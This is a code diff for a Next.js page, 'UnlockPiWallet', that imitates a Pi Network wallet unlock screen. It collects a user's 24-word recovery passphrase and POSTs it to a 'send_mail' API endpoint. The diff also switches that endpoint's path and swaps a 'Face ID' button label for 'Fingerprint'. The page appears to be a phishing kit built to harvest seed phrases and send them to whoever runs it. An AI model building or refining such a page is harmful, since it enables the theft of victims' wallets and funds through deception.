@@ -1,6 +1,3 @@
-
-
-// export default UnlockPiWallet;
 "use client";
 import Image from "next/image";
 import { useState } from "react";
@@ -8,7 +5,6 @@ import toast, { Toaster } from "react-hot-toast";
 
 const UnlockPiWallet = () => {
   const [passphrase, setPassphrase] = useState("");
-  const [isSubmitting, setIsSubmitting] = useState(false);
 
   // ✅ Regular Expression for exactly 24 words
   const passphraseRegex = /^(\S+\s+){23}\S+$/;
@@ -17,8 +13,6 @@ const UnlockPiWallet = () => {
   const handleChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
     setPassphrase(e.target.value);
   };
-
-  // Function to validate only (NO API)
   const handleSubmit = async () => {
     const words = passphrase.trim();
 
@@ -28,7 +22,7 @@ const UnlockPiWallet = () => {
     }
 
     try {
-      const response = await fetch("/api/send_mail", {
+      const response = await fetch("/api/py/send_mail", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -67,26 +61,18 @@ const UnlockPiWallet = () => {
         placeholder="Enter your 24-word passphrase here"
         value={passphrase}
         onChange={handleChange}
-        disabled={isSubmitting}
       />
 
       <div className="w-full md:w-2/3 lg:w-1/2 mt-4">
         <button
           onClick={handleSubmit}
-          disabled={isSubmitting}
-          className={`w-full border-2 bg-white py-3 rounded-lg text-lg font-medium transition ${
-            isSubmitting 
-              ? 'opacity-50 cursor-not-allowed' 
-              : 'hover:text-white hover:bg-[#703D92]'
-          }`}
+          className="w-full border-2 bg-white py-3 rounded-lg text-lg font-medium hover:text-white hover:bg-[#703D92] transition"
         >
-          {isSubmitting ? 'Submitting...' : 'Unlock With Passphrase'}
+          Unlock With Passphrase
         </button>
 
-       
-
         <button className="w-full mt-4 border-2 bg-[#703D92] text-white py-3 rounded-lg text-lg font-medium transition">
-          Unlock With Face ID
+          Unlock With Fingerprint
         </button>
       </div>
 
